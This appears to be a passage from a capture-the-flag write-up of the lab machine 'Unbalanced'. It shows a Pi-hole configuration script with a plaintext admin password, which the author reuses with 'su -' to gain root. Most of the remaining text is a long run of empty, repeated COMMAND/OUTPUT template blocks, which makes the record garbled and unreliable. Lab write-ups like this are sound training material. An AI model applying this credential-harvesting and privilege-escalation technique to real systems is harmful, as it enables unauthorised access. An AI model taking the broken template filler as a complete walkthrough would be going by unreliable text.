+-rw-r--r-- 1 root root    485 Apr  6  2020 pihole_config.sh
+$ cat pihole_config.sh
+#!/bin/bash
+
+# Add domains to whitelist
+/usr/local/bin/pihole -w unbalanced.htb
+/usr/local/bin/pihole -w rebalanced.htb
+
+# Set temperature unit to Celsius
+/usr/local/bin/pihole -a -c
+
+# Add local host record
+/usr/local/bin/pihole -a hostrecord pihole.unbalanced.htb 127.0.0.1
+
+# Set privacy level
+/usr/local/bin/pihole -a -l 4
+
+# Set web admin interface password
+/usr/local/bin/pihole -a -p 'bUbBl3gUm$43v3Ry0n3!'
+
+# Set admin email
+/usr/local/bin/pihole -a email admin@unbalanced.htb
+$ 
+================================================================================================
+
+We get the password "bUbBl3gUm$43v3Ry0n3!" so now we can attempt to elevate our privileges to root 
+using this password.
+
+COMMAND:
+================================================================================================
+bryan@unbalanced:~$ su -
+Password: 
+root@unbalanced:~# whoami
+root
+================================================================================================
+OUTPUT:
+================================================================================================
+================================================================================================
+
+COMMAND:
+================================================================================================
+================================================================================================
+OUTPUT:
+================================================================================================
+================================================================================================
+
+COMMAND:
+================================================================================================
+================================================================================================
+OUTPUT:
+================================================================================================
+================================================================================================
+
+COMMAND:
+================================================================================================
+================================================================================================
+OUTPUT:
+================================================================================================
+================================================================================================
+
+COMMAND:
+================================================================================================
+================================================================================================
+OUTPUT:
+================================================================================================
+================================================================================================
+
+COMMAND:
+================================================================================================
+================================================================================================
+OUTPUT:
+================================================================================================
+================================================================================================
+
+COMMAND:
+================================================================================================
+================================================================================================
+OUTPUT:
+================================================================================================
+================================================================================================
+
+COMMAND:
+================================================================================================
+================================================================================================
+OUTPUT:
+================================================================================================
+================================================================================================
+
+COMMAND:
+================================================================================================
+================================================================================================
+OUTPUT:
+================================================================================================
+================================================================================================
+
+COMMAND:
+================================================================================================
+================================================================================================
+OUTPUT:
+================================================================================================
+================================================================================================
+
+COMMAND:
+================================================================================================
+================================================================================================
+OUTPUT:
+================================================================================================
+================================================================================================
+
+COMMAND:
+================================================================================================
+================================================================================================
+OUTPUT:
+================================================================================================
+================================================================================================
+
+COMMAND:
+================================================================================================
+================================================================================================
+OUTPUT:
+================================================================================================
+================================================================================================
+
+COMMAND:
+================================================================================================
+================================================================================================
+OUTPUT:
+================================================================================================
+================================================================================================
+
+COMMAND:
+================================================================================================
+================================================================================================
+OUTPUT:
+================================================================================================
+================================================================================================
+
+COMMAND:
+================================================================================================
+================================================================================================
+OUTPUT:
+================================================================================================
+================================================================================================
+
+COMMAND:
+================================================================================================
+================================================================================================
+OUTPUT:
+================================================================================================
+================================================================================================
+
+COMMAND:
+================================================================================================
+================================================================================================
+OUTPUT:
+================================================================================================
+================================================================================================
+
+COMMAND:
+================================================================================================
+================================================================================================
+OUTPUT:
+================================================================================================
+================================================================================================
+
+COMMAND:
+================================================================================================
+================================================================================================
+OUTPUT:
+================================================================================================
+================================================================================================
+
+COMMAND:
+================================================================================================
+================================================================================================
+OUTPUT:
+================================================================================================
+================================================================================================
+
+COMMAND:
+================================================================================================
+================================================================================================
+OUTPUT:
+================================================================================================
+================================================================================================
+
+COMMAND:
+================================================================================================
+================================================================================================
+OUTPUT:
+================================================================================================
+================================================================================================
+
